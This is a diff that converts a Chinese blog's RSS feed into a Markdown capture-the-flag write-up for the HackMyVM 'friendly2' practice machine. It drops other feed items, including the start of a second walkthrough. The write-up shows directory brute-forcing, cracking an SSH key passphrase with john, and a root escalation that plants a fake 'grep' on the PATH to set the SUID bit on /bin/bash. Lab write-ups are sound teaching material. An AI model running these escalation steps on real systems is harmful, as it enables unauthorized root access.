@@ -1,5 +1,4 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>7r1UMPH blog</title><link>https://7r1UMPH.github.io</link><description>人生一世，草木一秋</description><copyright>7r1UMPH blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>http://7r1UMPH.github.io/sdfsdfdf.ico</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Sat, 01 Feb 2025 00:35:46 +0000</lastBuildDate><managingEditor>7r1UMPH blog</managingEditor><ttl>60</ttl><webMaster>7r1UMPH blog</webMaster><item><title>hmv_friendly2</title><link>https://7r1UMPH.github.io/post/hmv_friendly2.html</link><description># 0.简介
+# 0.简介
 
 **靶机**：[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
 **难度**：绿色
@@ -34,12 +33,12 @@ Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
 
 ```bash
 ┌──(kali㉿kali)-[~/test]
-└─$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+└─$ feroxbuster -u "http://192.168.205.138" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                   
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben 'epi' Risher 🤓                 ver: 2.11.0
+by Ben "epi" Risher 🤓                 ver: 2.11.0
 ───────────────────────────┬──────────────────────
  🎯  Target Url            │ http://192.168.205.138
  🚀  Threads               │ 50
@@ -58,23 +57,23 @@ by Ben 'epi' Risher 🤓                 ver: 2.11.0
 404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
 403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
 200      GET       91l      262w     2698c http://192.168.205.138/
-301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
-301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
+301      GET        9l       28w      319c http://192.168.205.138/assets => http://192.168.205.138/assets/
+301      GET        9l       28w      318c http://192.168.205.138/tools => http://192.168.205.138/tools/
 200      GET       91l      262w     2698c http://192.168.205.138/index.html
 200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
 200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
 200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
 200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
-301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
+301      GET        9l       28w      328c http://192.168.205.138/tools/documents => http://192.168.205.138/tools/documents/
 200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
 200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
 200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
 200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
 [####################] - 2m    622895/622895  0s      found:13      errors:1    
 [####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
-[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ => Directory listing (add --scan-dir-listings to scan)
 [####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
-[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ => Directory listing (add --scan-dir-listings to scan)
 ```
 
 其中`/tools/`目录，我们比较感兴趣
@@ -111,7 +110,7 @@ Enter passphrase for key 'id_rsa':
 
                                                                                                                                   
 ┌──(kali㉿kali)-[~/test]
-└─$ ssh2john id_rsa &gt; hash                           
+└─$ ssh2john id_rsa > hash                           
                                                                                                                                   
 ┌──(kali㉿kali)-[~/test]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
@@ -153,28 +152,28 @@ User gh0st may run the following commands on friendly2:
 gh0st@friendly2:~$ cat /opt/security.sh
 #!/bin/bash
 
-echo 'Enter the string to encode:'
+echo "Enter the string to encode:"
 read string
 
 # Validate that the string is no longer than 20 characters
 if [[ ${#string} -gt 20 ]]; then
-  echo 'The string cannot be longer than 20 characters.'
+  echo "The string cannot be longer than 20 characters."
   exit 1
 fi
 
 # Validate that the string does not contain special characters
-if echo '$string' | grep -q '[^[:alnum:] ]'; then
-  echo 'The string cannot contain special characters.'
+if echo "$string" | grep -q '[^[:alnum:] ]'; then
+  echo "The string cannot contain special characters."
   exit 1
 fi
 
 sus1='A-Za-z'
 sus2='N-ZA-Mn-za-m'
 
-encoded_string=$(echo '$string' | tr $sus1 $sus2)
+encoded_string=$(echo "$string" | tr $sus1 $sus2)
 
-echo 'Original string: $string'
-echo 'Encoded string: $encoded_string'
+echo "Original string: $string"
+echo "Encoded string: $encoded_string"
 gh0st@friendly2:~$ ls -la /opt/
 total 16
 drwxr-xr-x  3 root root 4096 Apr 29  2023 .
@@ -187,7 +186,7 @@ drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
 实现用户输入不超20个字符且不能有特殊符号，将输入信息ROT13 编码，我们改个环境变量就好了，它没用绝对路径
 
 ```bash
-gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
+gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' > grep
 gh0st@friendly2:/tmp$ chmod +x grep 
 gh0st@friendly2:/tmp$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
@@ -207,7 +206,7 @@ Not yet! Try to find root.txt.
 
 
 Hint: ...
-bash-5.1# find / -name '...' 2&gt;/dev/null
+bash-5.1# find / -name "..." 2>/dev/null
 /...
 bash-5.1# cd /.../
 bash-5.1# ls -al
@@ -226,64 +225,4 @@ Hint: numbers are not codified
 
 ```
 
-![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly2.html</guid><pubDate>Sat, 01 Feb 2025 00:35:17 +0000</pubDate></item><item><title>thl_Offensive</title><link>https://7r1UMPH.github.io/post/thl_Offensive.html</link><description>**靶机**：[thehackerslabs - offensive](https://thehackerslabs.com/offensive/)
-**难度**：专业（PROFESIONAL）
-**目标 IP**：192.168.205.220
-**本机 IP**：192.168.205.141
-
----
-
-## 1. 端口枚举及服务探测
-
-首先，使用 `nmap` 扫描目标 IP 的开放端口：
-
-```bash
-┌──(kali㉿kali)-[~/test]
-└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.220
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 11:32 CST
-Nmap scan report for 192.168.205.220
-Host is up (0.00034s latency).
-Not shown: 65532 closed tcp ports (conn-refused)
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
-80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
-8080/tcp open  http    Node.js Express framework
-MAC Address: 08:00:27:B1:A8:86 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.8
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
-```
-
-从 `nmap` 扫描结果来看，目标机器开放了 **22** (SSH) 、 **80** (HTTP) 端口、**8080**(HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/thl_Offensive.html</guid><pubDate>Sat, 01 Feb 2025 00:33:56 +0000</pubDate></item><item><title>kali 窗口不能移动或没有了右上角的控制按钮拯救计划</title><link>https://7r1UMPH.github.io/post/kali%20-chuang-kou-bu-neng-yi-dong-huo-mei-you-le-you-shang-jiao-de-kong-zhi-an-niu-zheng-jiu-ji-hua.html</link><description>今天晚上，月色明媚，我在电脑前一边吃火锅、唱歌，一边编写Wave的WP。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/kali%20-chuang-kou-bu-neng-yi-dong-huo-mei-you-le-you-shang-jiao-de-kong-zhi-an-niu-zheng-jiu-ji-hua.html</guid><pubDate>Sat, 01 Feb 2025 00:33:03 +0000</pubDate></item><item><title>老爷保号</title><link>https://7r1UMPH.github.io/post/lao-ye-bao-hao.html</link><description>```
-/*
- *                        _oo0oo_
- *                       o8888888o
- *                       88' . '88
- *                       (| -_- |)
- *                       0\  =  /0
- *                     ___/`---'\___
- *                   .' \\|     |// '.
- *                  / \\|||  :  |||// \
- *                 / _||||| -:- |||||- \
- *                |   | \\\  - /// |   |
- *                | \_|  ''\---/''  |_/ |
- *                \  .-\__  '-'  ___/-. /
- *              ___'. .'  /--.--\  `. .'___
- *           .'' '&lt;  `.___\_&lt;|&gt;_/___.' &gt;' ''.
- *          | | :  `- \`.;`\ _ /`;.`/ - ` : | |
- *          \  \ `_.   \_ __\ /__ _/   .-` /  /
- *      =====`-.____`.___ \_____/___.-`___.-'=====
- *                        `=---='
- * 
- * 
- *      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- * 
- *            佛祖保佑       永不宕机     永无BUG
- */
-```。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/lao-ye-bao-hao.html</guid><pubDate>Sat, 01 Feb 2025 00:30:40 +0000</pubDate></item><item><title>测试</title><link>https://7r1UMPH.github.io/post/ce-shi.html</link><description>测试。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/ce-shi.html</guid><pubDate>Fri, 31 Jan 2025 23:57:58 +0000</pubDate></item></channel></rss>
+![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)
